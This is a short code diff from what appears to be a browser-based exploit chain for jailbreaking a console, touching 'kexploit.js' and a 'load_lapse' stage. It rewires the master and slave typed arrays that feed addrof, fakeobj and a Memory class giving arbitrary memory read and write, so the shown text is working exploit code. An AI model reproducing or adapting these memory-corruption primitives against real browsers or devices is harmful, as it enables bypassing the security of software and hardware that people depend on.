@@ -410,8 +410,12 @@ addEventListener('unhandledrejection', event => {
     //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
 
     //create compat stuff for kexploit.js
-   var expl_master = new Uint32Array(8);
-    var expl_slave = new Uint32Array(2);
+  // var expl_master = new Uint32Array(8);
+  //  var expl_slave = new Uint32Array(2);
+
+var shared_buf = new ArrayBuffer(0x10);  
+var expl_master = new Uint32Array(shared_buf);
+var expl_slave = new DataView(shared_buf);	
 
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
@@ -646,11 +650,11 @@ async function load_lapse() {
   const obj_bt = new Int64(btRaw  >>> 0, (btRaw  / 0x100000000) >>> 0);
 
   const off0x10 = new Int64(0x10, 0);
- const master_b = new Uint32Array(new ArrayBuffer(1));  
-  const slave_b  = new DataView   (new ArrayBuffer(1)); 
+// const master_b = new Uint32Array(new ArrayBuffer(1));  
+ // const slave_b  = new DataView   (new ArrayBuffer(1)); 
   new Memory(
-    master_b,
-    slave_b,
+    expl_master,
+    expl_slave,
     obj,
     obj_p.add(off0x10),
     obj_bt
